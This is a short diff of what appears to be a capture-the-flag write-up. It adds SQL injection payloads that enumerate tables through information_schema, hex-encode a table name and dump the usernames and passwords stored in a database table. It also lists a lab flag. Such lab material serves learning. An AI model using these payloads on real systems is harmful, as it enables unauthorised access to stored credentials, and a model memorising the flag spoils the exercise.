@@ -169,12 +169,14 @@ Flag: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
 
 db_default SQL Injection
 
+`1 or 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables`
+There is a `db_default` table on the database as well in the database `Member_Brute_Force`
+
+>db_default -> hex = 0x64625f64656661756c74
+
 `1 or 1=1 UNION SELECT NULL,group_concat(column_name) FROM information_schema.columns where table_name = 0x64625f64656661756c74`
 
 >id,username,password
-
-Member_Brute_Force
-db_default
 
 `1 or 1=1 UNION SELECT NULL,group_concat(id,0x0a,username,0x0a,password) from Member_Brute_Force.db_default`
 
